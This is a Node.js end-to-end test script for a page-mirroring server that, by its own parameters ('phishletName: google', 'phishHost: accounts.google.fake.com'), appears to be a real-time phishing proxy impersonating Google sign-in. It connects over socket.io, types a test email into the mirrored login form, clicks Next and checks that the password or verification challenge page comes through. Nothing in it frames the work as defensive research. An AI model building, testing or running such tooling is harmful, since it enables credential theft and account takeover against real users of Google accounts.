/**
 * E2E Next transition: email → Next → expect password/challenge snap.
 * node scripts/e2e-mirror-next.mjs
 */
import { io } from 'socket.io-client';

const BASE = process.env.MIRROR_BASE || 'http://127.0.0.1:1000';
const SESSION = `e2e-next-${Date.now()}`;
const EMAIL = process.env.MIRROR_TEST_EMAIL || 'test.user.lab@gmail.com';
const TIMEOUT_MS = Number(process.env.MIRROR_E2E_TIMEOUT || 120000);

function fail(msg) {
  console.error('FAIL:', msg);
  process.exit(1);
}

function waitEvent(socket, name, timeout = TIMEOUT_MS, pred = () => true) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`${name} timeout`)), timeout);
    const handler = (d) => {
      if (!pred(d)) return;
      clearTimeout(t);
      socket.off(name, handler);
      resolve(d);
    };
    socket.on(name, handler);
  });
}

async function main() {
  const health = await (await fetch(`${BASE}/health`)).json();
  console.log('health', health);
  if (!health.ok) fail('health');

  const socket = io(BASE, {
    path: '/socket.io',
    transports: ['polling'],
    upgrade: false,
    query: {
      sessionKey: SESSION,
      phishletName: 'google',
      phishHost: 'accounts.google.fake.com',
      vw: '1366',
      vh: '768',
    },
  });

  await new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('socket timeout')), 15000);
    socket.on('connect', () => { clearTimeout(t); resolve(); });
    socket.on('connect_error', reject);
  });

  const first = await waitEvent(socket, 'mirrorsnap', TIMEOUT_MS, (d) => /<input/i.test(d?.rootInner || ''));
  console.log('first snap', first.rootInner.length, /mirror\/proxy/i.test(first.head || '') ? 'has-proxy-css' : 'no-proxy-in-head');

  // Ensure proxy endpoint works for at least one stylesheet if present
  const m = String(first.head || '').match(/\/mirror\/proxy\?u=([^"'\s>]+)/);
  if (m) {
    const u = decodeURIComponent(m[1].replace(/&amp;/g, '&').split('&')[0] === m[1].split('&')[0]
      ? m[1].split('&sessionKey')[0]
      : m[1]);
    // href is already /mirror/proxy?u=ENCODED
    const hrefMatch = String(first.head || '').match(/href="(\/mirror\/proxy\?[^"]+)"/);
    if (hrefMatch) {
      const proxyUrl = BASE + hrefMatch[1].replace(/&amp;/g, '&');
      const pr = await fetch(proxyUrl);
      console.log('proxy sample', pr.status, pr.headers.get('content-type'), (await pr.arrayBuffer()).byteLength);
      if (!pr.ok) fail('mirror/proxy failed');
    }
  }

  socket.emit('inputchange', {
    csspath: 'input#identifierId',
    value: EMAIL,
    inputType: 'email',
  });
  await new Promise((r) => setTimeout(r, 600));

  socket.emit('click', {
    cssPath: '#identifierNext',
    clickLabel: 'Next',
    isSubmit: true,
    onPrimaryButton: true,
    x: 700,
    y: 500,
    vw: 1366,
    vh: 768,
    formFields: [{ csspath: 'input#identifierId', value: EMAIL, inputType: 'email' }],
  });

  const nextSnap = await waitEvent(socket, 'mirrorsnap', TIMEOUT_MS, (d) => {
    const html = String(d?.rootInner || '');
    return /type=["']password["']|name=["']Passwd["']|try another way|do you have your phone|enter your password|challenge/i.test(html);
  });
  console.log('after Next', nextSnap.rootInner.length);

  socket.close();
  console.log('PASS e2e-mirror-next build=' + (health.build || ''));
  process.exit(0);
}

main().catch((e) => fail(e.message || e));
